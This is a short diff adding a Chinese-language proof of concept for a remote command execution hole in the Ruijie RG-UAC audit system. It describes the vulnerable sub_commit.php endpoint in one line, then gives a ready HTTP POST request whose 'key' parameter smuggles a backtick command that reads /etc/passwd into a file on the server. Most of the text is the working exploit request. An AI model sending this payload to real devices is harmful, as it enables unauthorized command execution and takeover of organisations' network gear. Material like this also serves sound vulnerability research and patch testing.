@@ -1,0 +1,11 @@
+# 锐捷RG-UAC统一上网行为管理审计系统sub_commit.php远程代码执行漏洞
+# 锐捷RG-UAC中存在命令执行漏洞，应用程序管理网关后端/view/vpn/autovpn/sub_commit.php接口。攻击者可以执行任意命令来控制服务器权限。
+POST /view/vpn/autovpn/sub_commit.php?action=delete&acid=80051552&bid=hd_tag_m8mv245x HTTP/1.1
+Host: www.swaf.com
+Cookie: PHPSESSID=ebd507c9bc5a4293c3e5e596f37157bf
+RM-PRO-BusinessID: hd_tag_m8mv245x
+RM-PRO-Token: b3bb13b7f27b3df70f1778647845e5d0
+RM-PRO-Time: 1742808365569
+User-Agent: curl/7.83.1
+
+key=`cat /etc/passwd+>3.txt`
